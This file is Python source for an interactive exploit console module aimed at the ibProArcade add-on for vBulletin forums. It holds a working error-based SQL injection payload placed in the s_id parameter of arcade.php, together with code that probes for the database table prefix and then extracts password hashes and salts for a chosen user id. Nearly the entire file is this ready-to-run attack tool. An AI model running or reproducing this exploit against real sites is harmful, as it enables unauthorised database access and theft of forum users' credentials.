#!/usr/bin/env python
from includes.termcolor import colored
from includes.urlcheck import *
import urllib
import urllib2
import re
import HTMLParser
import urlparse

def get_table_prefix(url):
	openurl = urllib2.urlopen(url+"?act=Arcade&do=stats&comment=a&s_id=1'")
	response = openurl.read()
	if 'mySQL query error' in response:
		prefix = re.search('UPDATE(.*)games_scores', response).group(1).strip()
		if len(prefix) != 0:
			print ('Table prefix found: '+prefix)
		else:
			print ('No table prefix was found.')
	else:
		print ('The exploit was unsuccessful. Therefore no prefix was found.')
		print ('Check all vars and make sure they are correct.')
		print ('If everything is correct the site is probably not vuln.')

def initiate():
	exvars = [
	['HOST', 'Not Set', 'Host of target with http://!'],
	['PATH', '/forums', 'Path to forums on target host'],
	['TABLE', 'user', 'User table to extract data from'],
	['USERID', '1', 'Userid of to extract data for'],
	['COLUMNS', 'password,salt', 'Columns to extract data for. Seperate with a comma!!'],
	['SEPERATOR', ':', 'Seperator to seperate columns']
	]

	print ('\nType help for more information')
	while True:
		try:
			ibpro = raw_input('vbconsole('+colored('/exploits/ibproarcade', 'red')+')> ')
			if ibpro == 'exit':
				print ("Going back to home.")
				break
			elif ibpro == 'help':
				print ('show vars ~> Shows variables needed to run exploit and their current values')
				print ('set {VAR NAME} {VAR VALUE} ~> Set {VAR NAME} to {VAR VALUE}')
				print ('get prefix ~> Looks for table prefix')
				print ('run ~> Run the exploit')
				print ('exit ~> Go back to vBconsole home')
			elif ibpro == 'show vars':
				print ("Variables needed to run exploit.\n")
				count = 0
				while count < len(exvars):
					print (exvars[count][0]+" = "+exvars[count][1]+" ("+exvars[count][2]+")")
					count += 1
			elif ibpro[0:3] == 'set':
				setvar = ibpro.split(' ')[1]
				setval = ibpro.split(' ')[2:]
				count = 0
				while count < len(exvars):
					if exvars[count][0] == setvar:
						exvars[count][1] = " ".join(setval)
					count += 1
			elif ibpro == 'get prefix':
				if exvars[0][1].endswith('/'):
					host = exvars[0][1][:-1]
				else:
					host = exvars[0][1]
				if exvars[1][1] != '/' and exvars[1][1].endswith('/'):
					path = exvars[1][1]+"arcade.php"
				elif exvars[1][1] == '/':
					path = exvars[1][1]+"arcade.php"
				else:
					path = exvars[1][1]+"/arcade.php"
				url = host+path
				if check_url(url):
					get_table_prefix(url)
				else:
					print ('ibProArcade could not be found at: '+url)
			elif ibpro == 'run':
				columns = exvars[4][1].split(',')
				if exvars[0][1].endswith('/'):
					host = exvars[0][1][:-1]
				else:
					host = exvars[0][1]
				if exvars[1][1] != '/' and exvars[1][1].endswith('/'):
					path = exvars[1][1]+"arcade.php"
				elif exvars[1][1] == '/':
					path = exvars[1][1]+"arcade.php"
				else:
					path = exvars[1][1]+"/arcade.php"
				url = host+path
				if check_url(url):
					results = []
					for cols in columns:
						getdata = [
						('act', 'Arcade'),
						('do', 'stats'),
						('comment', 'a'),
						('s_id', "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT("+cols+") FROM "+exvars[2][1]+" WHERE id = "+exvars[3][1]+"),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)")
						]
						openurl = urllib2.urlopen(url+'?'+urllib.urlencode(getdata))
						response = openurl.read()
						for search in response.split("\n"):
							if 'Duplicate entry' in search:
								result = search.strip()
								result = result.replace('mySQL error', '')
								result = result.replace('Duplicate entry', '')
								result = result.replace('for key 1', '')
								result = result.strip()
								result = result.strip(':')
								result = result.strip()
								result = result.strip('\'')
								code = 0
								break
							elif 'mySQL error' in search: 
								result = search.strip()
								result = result.replace('MySQL Error', '')
								result = result.strip()
								result = result.strip(':')
								result = result.strip()
								code = 1
								break
							else:
								code = 2
						if code == 0:
							h = HTMLParser.HTMLParser()
							unescaped = h.unescape(result)
							if unescaped.endswith('1'):
								print (cols+': '+unescaped.strip('1'))
								results.append(unescaped.strip('1'))
							else:
								print (cols+': '+unescaped)
								results.append(unescaped)
						elif code == 1:
							print ('MySQL Error: '+result)
						else:
							print ('Exploit was unsuccessful!')
							print ('There could be various reasons for this:')
							print ('The userid you chose could be invalid')
							print ('The forum could be running a newer version of vB eliminating DB errors in the source')
							print ('I have also had sites not work without www. during testing')
							break
					if len(results) != 0:
						line = exvars[5][1].join(results)
						print ('\n'+line)
				else:
					print ('ibProArcade could not be found at: '+url)
		except KeyboardInterrupt:
			print ("\nGoing back to home.")
			break
